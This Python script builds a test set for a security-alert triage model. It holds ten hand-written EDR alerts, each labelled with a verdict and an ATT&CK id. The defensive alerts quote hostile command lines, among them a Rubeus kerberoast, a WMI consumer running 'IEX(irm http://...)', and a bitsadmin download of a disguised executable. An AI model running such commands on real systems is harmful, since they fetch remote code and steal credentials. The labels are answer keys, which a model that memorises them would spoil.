"""
Out-of-distribution (OOD) test set: hand-written alerts for techniques and
benign behaviors that do NOT appear in the training templates. This measures
whether the fine-tuned model learned triage reasoning or just memorized the
15 training scenarios. Writes data/ood_test.jsonl in the same schema as test.jsonl.
"""
import json
import os

from generate_dataset import SYSTEM_PROMPT

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data", "ood_test.jsonl")

# (scenario, expected verdict, expected primary ATT&CK id, alert text)
ALERTS = [
    ("kerberoast_rubeus", "True Positive", "T1558.003", r"""EDR ALERT
Detection: Suspicious Kerberos service ticket requests
Vendor severity: High
Timestamp: 2026-05-14T02:41:09Z
Host: WS-SLS-091 (Device group: Sales Workstations, OS: Windows 11 23H2)
User: CORP\tmurphy
Process: C:\Users\tmurphy\AppData\Local\Temp\r.exe
Command line: r.exe kerberoast /outfile:C:\Users\Public\h.txt /rc4opsec
Process tree: powershell.exe <- cmd.exe <- explorer.exe
Signature: Unsigned
SHA256: 6f1c0a9e2b7d4c3e8a5f9b0d1e2c3a4b5d6e7f8091a2b3c4d5e6f708192a3b4c
Additional context: 47 TGS requests with RC4 encryption for distinct service accounts within 20 seconds; output file h.txt written"""),

    ("dll_sideload", "True Positive", "T1574.002", r"""EDR ALERT
Detection: Signed binary loaded unsigned DLL from user-writable path
Vendor severity: High
Timestamp: 2026-06-02T10:12:44Z
Host: WS-HR-033 (Device group: HR Workstations, OS: Windows 10 22H2)
User: CORP\pnguyen
Process: C:\Users\pnguyen\AppData\Local\Temp\Rar$EXa412\Resume_Viewer.exe
Command line: "C:\Users\pnguyen\AppData\Local\Temp\Rar$EXa412\Resume_Viewer.exe"
Process tree: WinRAR.exe <- OUTLOOK.EXE <- explorer.exe
Signature: Signed: Microsoft Corporation (renamed OneDrive updater binary)
SHA256: 0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f9
Additional context: Loaded version.dll (unsigned, 0 prevalence) from the same folder instead of System32; process then connected to 185.212.47.9:443"""),

    ("wmi_persistence", "True Positive", "T1546.003", r"""EDR ALERT (JSON)
{
  "detection_name": "WMI event subscription created",
  "severity": "High",
  "timestamp": "2026-04-21T23:18:02Z",
  "device": {"hostname": "SRV-APP07", "device_group": "Application Servers", "os": "Windows Server 2019"},
  "user": "CORP\\svc_sql",
  "process": {"image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
              "command_line": "CommandLineEventConsumer 'Updater' -> powershell.exe -nop -w hidden -c IEX(irm http://91.208.13.77/u)",
              "ancestry": "powershell.exe <- sqlservr.exe",
              "signature": "Signed: Microsoft Windows", "sha256": "1f2e3d4c5b6a79881726354a5b6c7d8e9f0a1b2c3d4e5f60718293a4b5c6d7e8"},
  "context": "__EventFilter triggers every 300 seconds; consumer created by PowerShell spawned from sqlservr.exe"
}"""),

    ("browser_cred_theft", "True Positive", "T1555.003", r"""EDR ALERT
Detection: Unusual process accessed browser credential store
Vendor severity: High
Timestamp: 2026-07-30T13:05:51Z
Host: WS-FIN-118 (Device group: Finance Workstations, OS: Windows 11 24H2)
User: CORP\gkowalski
Process: C:\Users\gkowalski\AppData\Roaming\qzvmx\qzvmx.exe
Command line: qzvmx.exe
Process tree: explorer.exe
Signature: Unsigned
SHA256: 9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d
Additional context: Read Chrome 'Login Data' and 'Local State' and Edge 'Login Data'; created a ZIP in %TEMP% then sent 2.1 MB to api.telegram.org"""),

    ("bits_download", "True Positive", "T1197", r"""EDR ALERT
Detection: BITS job downloading executable
Vendor severity: Medium
Timestamp: 2026-03-11T04:27:13Z
Host: WS-ENG-201 (Device group: Engineering Workstations, OS: Windows 11 23H2)
User: CORP\rpatel
Process: C:\Windows\System32\bitsadmin.exe
Command line: bitsadmin /transfer upd /download /priority high http://103.77.192.4/k.png C:\ProgramData\k.exe
Process tree: cmd.exe <- wscript.exe <- explorer.exe
Signature: Signed: Microsoft Windows
SHA256: 3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b
Additional context: Downloaded file is a PE executable despite the .png name; executed 4 seconds later"""),

    ("windows_update_tiworker", "False Positive", "T1543.003", r"""EDR ALERT
Detection: Service binary modified in System32
Vendor severity: Medium
Timestamp: 2026-05-13T03:02:40Z
Host: WS-LGL-064 (Device group: Legal Workstations, OS: Windows 11 24H2)
User: NT AUTHORITY\SYSTEM
Process: C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26100.4061_none\TiWorker.exe
Command line: C:\Windows\WinSxS\...\TiWorker.exe -Embedding
Process tree: svchost.exe -k DcomLaunch <- services.exe
Signature: Signed: Microsoft Windows
SHA256: 7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b
Additional context: Replaced 214 files in System32 during cumulative update KB5058411 install; all new files Microsoft-signed; Patch Tuesday window"""),

    ("onedrive_mass_sync", "Benign True Positive", "T1486", r"""EDR ALERT (JSON)
{
  "detection_name": "Mass file modification consistent with ransomware",
  "severity": "High",
  "timestamp": "2026-02-09T09:14:22Z",
  "device": {"hostname": "WS-MKT-012", "device_group": "Marketing Workstations", "os": "Windows 11 23H2"},
  "user": "CORP\\cchen",
  "process": {"image": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe",
              "command_line": "\"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background",
              "ancestry": "explorer.exe", "signature": "Signed: Microsoft Corporation",
              "sha256": "4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a"},
  "context": "6,800 files written in 5 minutes after Known Folder Move enabled by Intune policy; extensions unchanged; no ransom notes"
}"""),

    ("vuln_scanner", "Benign True Positive", "T1046", r"""EDR ALERT
Detection: Network service scanning from internal host
Vendor severity: Medium
Timestamp: 2026-08-04T01:30:00Z
Host: SRV-SEC01 (Device group: Security Tooling Servers, OS: Windows Server 2022)
User: CORP\svc_nessus
Process: C:\Program Files\Tenable\Nessus\nessusd.exe
Command line: "C:\Program Files\Tenable\Nessus\nessusd.exe" -q
Process tree: services.exe
Signature: Signed: Tenable, Inc.
SHA256: 5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c
Additional context: Connections to 1,900 internal hosts on 140 ports; scan policy 'Weekly-Internal-Credentialed' scheduled for Mondays 01:30"""),

    ("odd_admin_rdp", "Needs Investigation", "T1021.001", r"""EDR ALERT
Detection: RDP logon from unusual source
Vendor severity: Medium
Timestamp: 2026-06-20T21:47:15Z
Host: SRV-FILE03 (Device group: File Servers, OS: Windows Server 2022)
User: CORP\adm-lgarcia
Process: C:\Windows\System32\rdpclip.exe
Command line: rdpclip
Process tree: svchost.exe -k termsvcs
Signature: Signed: Microsoft Windows
SHA256: 2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d
Additional context: Source workstation WS-MKT-077 (not a jump server); first RDP by this admin to this server in 90 days; logon succeeded with MFA; no file activity yet"""),

    ("teams_child_ok", "False Positive", "T1059.003", r"""EDR ALERT
Detection: Collaboration app spawned command shell
Vendor severity: Low
Timestamp: 2026-03-03T11:22:05Z
Host: WS-ENG-140 (Device group: Engineering Workstations, OS: Windows 11 24H2)
User: CORP\ytanaka
Process: C:\Windows\System32\cmd.exe
Command line: cmd.exe /d /s /c "reg query HKCU\Software\Microsoft\Office\Teams /v PreventInstallationFromMsi"
Process tree: ms-teams.exe <- explorer.exe
Signature: Signed: Microsoft Windows
SHA256: 8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e
Additional context: Same command seen from ms-teams.exe on 2,300 hosts this month; read-only registry query; no network or file writes"""),
]


def main():
    with open(OUT, "w", encoding="utf-8") as f:
        for scen, verdict, mitre, text in ALERTS:
            row = {"conversations": [
                       {"role": "system", "content": SYSTEM_PROMPT},
                       {"role": "user", "content": "Triage this alert:\n\n" + text},
                       {"role": "assistant", "content": "Verdict: {}\nMITRE ATT&CK: {}".format(verdict, mitre)}],
                   "meta": {"scenario": scen, "verdict": verdict, "mitre": mitre, "detection": "", "host": ""}}
            f.write(json.dumps(row, ensure_ascii=False) + "\n")
    print("wrote {} OOD alerts to {}".format(len(ALERTS), OUT))


if __name__ == "__main__":
    main()
